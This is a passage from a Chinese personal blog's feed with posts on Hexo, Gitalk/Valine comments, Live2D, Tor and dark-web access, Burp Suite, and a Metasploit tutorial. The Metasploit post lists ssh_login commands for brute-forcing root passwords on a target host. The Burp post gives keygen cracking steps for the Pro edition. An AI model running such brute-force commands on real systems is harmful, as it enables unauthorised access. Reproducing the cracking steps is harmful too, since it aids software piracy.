        <content type="html"><![CDATA[<blockquote><p><strong>注</strong>：本留言板功能依赖于第三方评论系统，请<strong>激活</strong>你的评论系统才有效果。<br>可同时开启多个留言板~</p></blockquote><h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h4 id="配置-Gitalk-评论模块"><a href="#配置-Gitalk-评论模块" class="headerlink" title="配置 Gitalk 评论模块"></a>配置 Gitalk 评论模块</h4><p>默认为不激活（ false）</p><pre><code>gitalk:  enable: true  owner: lateral404  repo: Leaving-a-message  oauth:    clientId:     clientSecret:   admin: lateral404</code></pre><h5 id="获取-clientId-和-clientSecret"><a href="#获取-clientId-和-clientSecret" class="headerlink" title="获取 clientId 和 clientSecret"></a>获取 clientId 和 clientSecret</h5><p>搞IT的一般都有Github账号，这个不用说了吧？话不多说直接开始上手吧 哈哈哈哈哈</p><p><a href="https://sitoi.cn/go.html?u=aHR0cHM6Ly9naXRodWIuY29tL3NldHRpbmdzL2FwcGxpY2F0aW9ucy9uZXc=" target="_blank" rel="noopener">https://github.com/settings/applications/new</a>浏览器打开这个URL，填写填写方法如下</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124185931.PNG" alt=""></p><ul><li><code>Application name</code>：应用名称，随便填</li><li><code>Homepage URL</code>：没有过多要求，可以填自己的博客地址(避免出问题最和Authorization callback URL好统一)</li><li><code>Application description</code>：应用描述，描述一下，无要求</li><li><code>Authorization callback URL</code>：这个就有要求了，填自己要使用 Gitalk 的博客地址，不可乱填</li></ul><p>接着，你就可以得到 Client ID 和 Client Secret</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124190013.PNG" alt=""></p><h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><pre><code>gitalk:  enable: true  owner: lateral404  repo: Leaving-a-message  oauth:    clientId: 0d***************fd0    clientSecret: ae9******************4feb27  admin: lateral404</code></pre><ul><li><code>enable</code>：true # 指的是是否开启 Gitalk</li><li><code>owner</code>：sitoi # 这个项目名的拥有者（GitHub账号或组织）</li><li><code>repo</code>：Sitoi.github.io # 你要存放的项目名，下文会详细再说</li><li><code>clientId</code>：xxxxxx # 之前的 Client ID</li><li><code>ClientSecret</code>：xxxxxx # 之前的 Client Secret</li><li><code>admin</code>：sitoi # 管理员用户，下文也会详细讲</li></ul><p><code>repo</code>：Gitalk 是基于 GitHub 的 issues 功能的，所以，你要为他建一个库或用现成的库，我个人建议新建一个，而 repo 就是你要用的库的名称。 比如，我就为 Gitalk 专门建了一个叫 gitalk 的库，所以在 repo: 处填 gitalk。</p><p><code>admin</code>：即管理员帐号。如果你是个人账号，那么这里就填你的账户名和协作者的账户名。<strong>以数组形式</strong>。</p><p>数组写法：</p><pre><code>admin:- cat00011cat(用户名)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124190752.PNG" alt=""> </p><ul><li>如果提示 <strong>未找到相关的lssues进行评论请联系@Lateral404 初始化创建—&gt;&gt;使用Github登录即可解决。</strong>要是出现 登录跳转首页请检查你的配置。</li></ul><h4 id="Gitment评论模块"><a href="#Gitment评论模块" class="headerlink" title="Gitment评论模块"></a>Gitment评论模块</h4><p>默认不开启为false</p><p>配置方法同上</p><pre><code>获取 clientId 和 clientSecret 教程和上文一样</code></pre><p><em>链接千万不要填错，填错会出现登录之后跳转首页</em></p><p>别和博主一样是个憨憨，，，，当时博主就喝了假酒，，写错了url。。。结果就悲剧<em>了。</em></p><p>最后在博客根目录打开cmd窗口输入命令 <code>hexo cl &amp;&amp; hexo g -d</code> 清空缓存 生成网页并部署上传。</p><ul><li><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124191740.PNG" alt=""></li></ul><p>如果出现以上报错，输入<code>npm install hexo-filter-github-emojis --save</code>安装相关文件————如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124192142.PNG" alt=""></p><p>最后在执行<code>hexo cl &amp;&amp; hexo g -d</code>部署即可</p><ul><li>一次性设置GitHub pages页面的域名绑定</li></ul><p>需要在<code>G:\MyBlog\public</code>（<del>这个是我自己的路径</del>）新建一个<code>CNAME</code>文件，用<code>notepad</code>打开 写入自己的域名（此域名需要和GitHub pages绑定的一样）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124193021.PNG" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124192608.PNG" alt=""></p><ul><li>最终效果</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124192852.PNG" alt=""></p><p>不显示的话，清空缓存CTRL shift Delete</p><h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><ul><li><a href="https://valine.js.org/quickstart.html" target="_blank" rel="noopener">官网配置</a></li></ul><h2 id="获取APP-ID-和-APP-Key"><a href="#获取APP-ID-和-APP-Key" class="headerlink" title="获取APP ID 和 APP Key"></a>获取APP ID 和 APP Key</h2><p>请先<a href="https://leancloud.cn/dashboard/login.html#/signin" target="_blank" rel="noopener">登录</a>或<a href="https://leancloud.cn/dashboard/login.html#/signup" target="_blank" rel="noopener">注册</a> <code>LeanCloud</code>, 进入<a href="https://leancloud.cn/dashboard/applist.html#/apps" target="_blank" rel="noopener">控制台</a>后点击左下角<a href="https://leancloud.cn/dashboard/applist.html#/newapp" target="_blank" rel="noopener">创建应用</a>：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201020541.png" alt=""></p><p>应用创建好以后，进入刚刚创建的应用，选择左下角的<code>设置</code>&gt;<code>应用Key</code>，然后就能看到你的<code>APP ID</code>和<code>APP Key</code>了：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201020721.png" alt=""></p><p>回到博客主题根目录，配置Valine评论模块</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201020907.png" alt=""></p><p>最终效果</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201021008.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Get到一个Live2d小埋</title>
      <link href="/posts/32907.html"/>
      <url>/posts/32907.html</url>
      
        <content type="html"><![CDATA[<p>在一个夜深人静，月黑风高的夜晚。我又一次Get到一只小埋。哈哈哈哈</p><p>起因，从typecho转移过来，还是喜欢以前的小埋就打算把它也搬过来，可实在使用Live2D插件的时候替换小埋模型，我发现一个玄学小埋长大了Hahahahahaha</p><p>经过几小时的折腾，我还是没找到原因；既然找不到原因，总不能在一棵树上吊死。</p><p>随后我发现一种不需要插件支持就可以把小埋放到博客上去。实现方法也不是很难<del>~</del>好了，废话不多说。</p><h2 id="一、准备代码和工具"><a href="#一、准备代码和工具" class="headerlink" title="一、准备代码和工具"></a>一、准备代码和工具</h2><ul><li><p><a href="https://www.lanzous.com/b0bq6msmb" target="_blank" rel="noopener"><strong>全家桶已经打包好了：</strong>蓝走运下载</a>（密码：cxkw）</p></li><li><p><a href="https://mx.paul.ren/" target="_blank" rel="noopener">模型下载</a></p></li></ul><h2 id="二、配置模型"><a href="#二、配置模型" class="headerlink" title="二、配置模型"></a>二、配置模型</h2><p>1、首先将下载的Live2D-XiaoMai—live2d目录下的<code>live2d</code> <code>demo.html</code> <code>README.md</code>文件复制到<code>博客根目录下的public文件夹里</code>   <a href="https://www.lanzous.com/i8udxcb" target="_blank" rel="noopener">文件链接</a></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124112508.PNG" alt=""></p><p>浏览器输入<a href="http://localhost:4000/demo.html" target="_blank" rel="noopener">http://localhost:4000/demo.html</a> 预览</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124112509.PNG" alt=""></p><p>2、接下来再把live2d这个文件夹复制一份到<code>博客根目录下的themes\cat00011cat\source</code> 这个路径下</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124112510.PNG" alt=""></p><p>3、固定小埋显示位置</p><p>将以下代码放到MyBlog\themes\cat00011cat\layout_partial路径下的footer.ejs文件顶部</p><pre><code>&lt;footer class="page-footer bg-color"&gt;&lt;link rel="stylesheet" href="/live2d/css/live2d.css" /&gt;&lt;div id="landlord"&gt;    &lt;div class="message" style="opacity:0"&gt;&lt;/div&gt;    &lt;canvas id="live2d" width="166" height="250" class="live2d"&gt;&lt;/canvas&gt;    &lt;div class="hide-button"&gt;隐藏&lt;/div&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;    var message_Path = '/live2d/'    var home_Path = 'http://www.thecat.top'    var voice_Path = '/live2d/'&lt;/script&gt;&lt;script type="text/javascript" src="/live2d/js/live2d.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="/live2d/js/message.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;    loadlive2d("live2d", "/live2d/model/tia/model.json");&lt;/script&gt;</code></pre><p>如图</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124112511.PNG" alt=""></p><p>4、最后hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</p><p>访问<a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 小埋就显示出来了。Ctrl 5强制刷新浏览器缓存。</p><p>效果</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200124121620.PNG" alt=""></p><p>有了声音的小埋，更加的逼真阔爱 哈哈哈哈</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何进入暗网世界（技术交流）</title>
      <link href="/posts/25234.html"/>
      <url>/posts/25234.html</url>
      
        <content type="html"><![CDATA[<h1 id="如何快速进入暗网？？？"><a href="#如何快速进入暗网？？？" class="headerlink" title="如何快速进入暗网？？？"></a>如何快速进入暗网？？？</h1><p>据说我们能看的互联网只是极小极小的冰山一角，而大多数人看不到的，才是真正的互联网，这里潜藏着人性最为黑暗的一面。</p><p>暗网呢就是指的是一些灰色的非法网站，这些非法的网站将他们的资源联系到一起形成了一个庞大的网络，这就是暗网。这些网站的进入方式也和我们传统的访问不太一样，并不是输入个域名和地址就可以访问的。这样不就很容易的被安全部门追查到了吗？这么愚蠢的行为，我相信暗网的人绝对不会这么傻的/【【【【</p><p><strong>现在我就演示一下如何带你去访问暗网</strong><br>再次声明，本文只针对爱好者纯技术学习,仅用于技术交流；请勿用于违法犯罪。遵守国家网络安全法，携手共建国家网络安全！</p><p><strong>下载TOR（洋葱浏览器）/安装</strong><br>简单介绍一下这款浏览器：<br>Tor是一款匿名访问网络的的软件，用户通过Tor可以在因特网上进行匿名交流，同时能让你保持匿名的免费开源软件。</p><p><a href="https://www.torproject.org/download/" target="_blank" rel="noopener">Tor浏览器官方下载</a></p><p><a href="https://github.com/TheTorProject/gettorbrowser" target="_blank" rel="noopener">GitHub下载</a></p><p><em>注意别安装在Windows的C盘上</em><br>如果想要完全匿名，为了绝对安全起见，把程序安装在U盘上。U盘一拔，谁也不知道你干了什么。</p><p><strong>连上VPN翻墙</strong><br>VPN软件可以上网搜索（最好连接美国节点）</p><p><a href="https://hotspot-shield.en.softonic.com/" target="_blank" rel="noopener">VPN下载</a></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200122095630.png" alt=""></p><p><strong>设置高级隐私</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200122095629.png" alt=""></p><p>防止在进入暗网的过程中，网站执行恶意脚本<br><strong>关闭Tor浏览器</strong><br>等待更新</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200122095633.png" alt=""></p><p>重启浏览器</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200122095631.png" alt=""></p><p><strong>输入暗网域名 进入暗网</strong><br>通过这个浏览器去访问这个暗网才可以访问哦<br>这里就不提供网址啦</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200122095634.png" alt=""></p><p>这个就是暗网的样子。暗网域名都是onion结尾的（这上面的网站大多数的交易都是违法的，其中交易的货币都是通过比特币来进行的。）</p><p><a href="https://www.lanzous.com/b0bq3oxfi" target="_blank" rel="noopener">进入暗网软件下载</a>　密码４９ｌｚ</p><blockquote><p>郑重提醒：本文纯属技术学习，心里要有杆秤。坏的方面我不去做，你也别去做，里面大部分的交易都属于非法交易。望各位自重。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp安装与实践</title>
      <link href="/posts/9391.html"/>
      <url>/posts/9391.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>软件下载：</strong><a href="https://pan.baidu.com/s/1ERPzdPV5NLsK0DqAgDpn0w" target="_blank" rel="noopener">Burp2.0.11Pro百度网盘</a></p></blockquote><p><strong><code>Burp Suite 介绍</code></strong></p><ul><li>Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。</li><li>Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。</li><li>所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</li></ul><p><strong>工具箱</strong></p><ul><li>Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</li><li>Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</li><li>Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。</li><li>Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</li><li>Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。</li><li>Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</li><li>Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。</li><li>Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</li></ul><h3 id="Java环境配置"><a href="#Java环境配置" class="headerlink" title="Java环境配置"></a>Java环境配置</h3><p><strong>0x1</strong></p><p><code>安装burp的前提需要Java环境的支持</code></p><p>双击<code>Java环境一键配置.bat</code>这个软件一件自动化配置；</p><p>有了Java环境之后；</p><p>我们就可以开始接下来的操作！！！</p><h3 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h3><p>第一步打开<code>burp-loader-keygen-jas502n.jar破解补丁</code>，</p><p>把<code>burp</code>和<code>破解补丁</code>放在<code>同目录下</code></p><p>点击<code>Run</code></p><p>运行之后修改<code>License text</code>选项框里面的字符<br>改成自己喜欢的把。</p><p>把那个<code>License</code>值复制粘贴到burp的那个框框里。</p><p>之后点击<code>Next</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200117130412.png" alt=""></p><h3 id="0x2Next"><a href="#0x2Next" class="headerlink" title="0x2Next"></a>0x2Next</h3><p>接着点击<code>Manual activation</code>这个选项</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200117130417.png" alt=""></p><h3 id="0x3生成注册码"><a href="#0x3生成注册码" class="headerlink" title="0x3生成注册码"></a>0x3生成注册码</h3><p><em>对burp执行注册</em></p><h2 id="Manual-Activation"><a href="#Manual-Activation" class="headerlink" title="Manual Activation"></a><code>Manual Activation</code></h2><p>进入到<code>Manual Activation</code></p><p>将<code>Copy request</code>里的<code>key值</code></p><p>复制粘贴到<code>Activation Request</code>的输入框里</p><p>这个时候破解补丁会生成一个<code>key值</code><br>将<code>Activation Response</code>生成的key值<br>复制粘贴到<code>Paste Response</code>输入框</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200117130414.png" alt=""></p><p><strong>点击Next进行下一步</strong></p><p>接着点击<code>Finish</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200117130413.png" alt=""></p><blockquote><p>如果出现一个提示是否删除缓存，，点击取消即可</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200117130415.png" alt=""></p><p><em>等待程序启动即可</em></p><h3 id="完美破解"><a href="#完美破解" class="headerlink" title="完美破解"></a>完美破解</h3><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200117130416.png" alt=""></p><blockquote><p>要是觉得每次打开软件都不方便，都需要去到目录打开。</p><p>我们可以写一个简单的.bat <em>在软件目录写好</em></p><p>发送快捷方式到桌面即可</p><p>bat代码如下</p></blockquote><pre><code>@echo nojava -jar burpsuite_pro_v2.0.11beta.jarpause</code></pre><blockquote><p><strong>Burp1.7</strong>：<a href="https://share.weiyun.com/5Js5vyD" target="_blank" rel="noopener">微云网盘下载</a></p></blockquote><p>下载好工具之后，我们得下载<a href="https://www.java.com/zh_CN/download/windows-64bit.jsp" target="_blank" rel="noopener">Java jre</a></p><p>需要注意的是安装Java jre路径不能是中文路径，最好使用默认路径安装。（使用javajdk的话需要配置系统变量，然而使用Java jre就不用配置，安装好直接可以用）</p><p>装好Java jre环境之后，我们双击打开burp就行，，不用安装哦。</p><h3 id="设置代理："><a href="#设置代理：" class="headerlink" title="设置代理："></a>设置代理：</h3><p>火狐浏览器推荐使用一个插件<strong>Foxy proxy</strong>设置代理。127.0.0.1:8080</p><ul><li><p>全局代理</p><p>Burp将拦截所有HTTP/HTTPS传输的数据包</p><ul><li><p>如何设置全局代理？</p><p>IE浏览器–&gt;&gt;设置–&gt;&gt;Internet选项–&gt;&gt;连接–&gt;&gt;局域网设置–&gt;&gt;为LAN设置VPN连接</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200117133921.png" alt=""></p></li></ul></li><li><p>局部代理</p><p>Burp只拦截当前代理浏览器的传输的数据包</p></li></ul><p><em>Burp相当于一个中间人，可以控制数据包的传输。</em></p><h3 id="导入CA证书抓取HTTPS数据包"><a href="#导入CA证书抓取HTTPS数据包" class="headerlink" title="导入CA证书抓取HTTPS数据包"></a>导入CA证书抓取HTTPS数据包</h3><p>1.首先打开火狐浏览器输入<a href="http://burp" target="_blank" rel="noopener">http://burp</a> 回车访问。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200118223544.PNG" alt=""></p><p>点击<code>CA Certificate</code>下载证书</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200118223545.PNG" alt=""></p><p>2.找到火狐浏览器的设置—&gt;&gt;隐私与安全—&gt;&gt;<a href="about:preferences#privacy">证书（查看证书）</a></p><p>然后再<code>证书管理器</code>里找到<code>证书颁发机构</code>导入证书</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200118223543.PNG" alt=""></p><p>3.勾选全部信任并确定</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200118223542.PNG" alt=""></p><p>此时证书就已经导入好了，重启浏览器 就可以抓到HTTPS协议头的包啦。</p><blockquote><p>如果还是抓不到的话，就要去设置SSL代理127.0.0.1:8080；设置完确定。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200118223540.PNG" alt=""></p><p>这个时候就可以抓到HTTP的数据包了：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200118223541.PNG" alt=""></p><p>在爆破过程中要注意一个事项，如果爆破速度没有匀速增长，越来越慢，说明服务器容器已经不能够及时处理我们发出的请求，<br>这个时候我们就需要暂停，避免把网站搞崩了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改GitBash窗口默认字体大小</title>
      <link href="/posts/683.html"/>
      <url>/posts/683.html</url>
      
        <content type="html"><![CDATA[<p>首先右键桌面，打开Git Bash终端。</p><p>在终端中鼠标右键点击，在弹出的菜单栏选择<code>Options</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200114173515.png" alt=""></p><p>接着在菜单栏选择<code>Text</code>点击<code>Select</code>自行调整字体——最后点击<code>save</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200114173516.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF目标主机内网渗透之SSH暴力破解</title>
      <link href="/posts/11738.html"/>
      <url>/posts/11738.html</url>
      
        <content type="html"><![CDATA[<h1 id="爆破环境支持"><a href="#爆破环境支持" class="headerlink" title="爆破环境支持"></a>爆破环境支持</h1><blockquote><p><strong>攻击机和目标主机在同一内网下；目标主机（受害者）必须开放一些端口服务，例如21端口ftp服务、22端口ssh服务等…</strong></p></blockquote><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><blockquote><p><strong>一台开放22端口的主机（靶机）</strong></p><p><strong>一台Kali LInux（攻击机）</strong></p></blockquote><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="启用MSF终端并搜索相关工具及载荷"><a href="#启用MSF终端并搜索相关工具及载荷" class="headerlink" title="启用MSF终端并搜索相关工具及载荷"></a>启用MSF终端并搜索相关工具及载荷</h2><p>首先打开Kali Linux终端输入<code>msfconsole</code>命令启动Metasploit终端。等待终端加载……</p><p>然后在终端输入命令<code>search ssh_login</code>搜索ssh_login的相关工具和攻击载荷；</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200114163238.jpg" alt=""></p><h2 id="启用漏洞利用模块"><a href="#启用漏洞利用模块" class="headerlink" title="启用漏洞利用模块"></a>启用漏洞利用模块</h2><p>在终端输入命令<code>use auxiliary/scanner/ssh/ssh_login</code>启用漏洞利用模块，提示符会自动进入该路径下；</p><p>接着在终端中输入命令<code>show options</code>查看需要设置的相关项，<strong>yes</strong>表示必须填写的参数。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200114163239.jpg" alt=""></p><h2 id="填写相关参数"><a href="#填写相关参数" class="headerlink" title="填写相关参数"></a>填写相关参数</h2><p><strong>设置目标主机的IP地址</strong></p><p><code>set RHOSTS xxx.xxx.x.x</code></p><p><strong>设置22端口</strong></p><p><code>set RPORT 22</code></p><p><strong>指定登录用户名”root”</strong></p><p><code>set USERNAME root</code></p><p><strong>设置暴力破解字典的路径</strong></p><p><code>set PASS_FILE  /root/deaktop/passwd.txt</code></p><p><strong>设置线程</strong></p><p><code>set THEEADS 100</code></p><p><strong>运行</strong></p><p><code>run &amp; exploit</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200114163240.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>保姆级搭建Hexo步骤</title>
      <link href="/posts/63097.html"/>
      <url>/posts/63097.html</url>
      
        <content type="html"><![CDATA[<p>在喜欢的目录下，新建blog文件夹</p><p>使用命令行，进入到blog文件夹 比如，我把文件夹新建到C盘的hexo目录</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170344.png" alt=""></p><p><code>npm install -g hexo-cli</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170345.png" alt=""></p><p><code>hexo init</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170347.png" alt=""></p><p><code>npm install</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170346.png" alt=""></p><p><code>npm install --save hexo-deployer-git</code></p><p><img 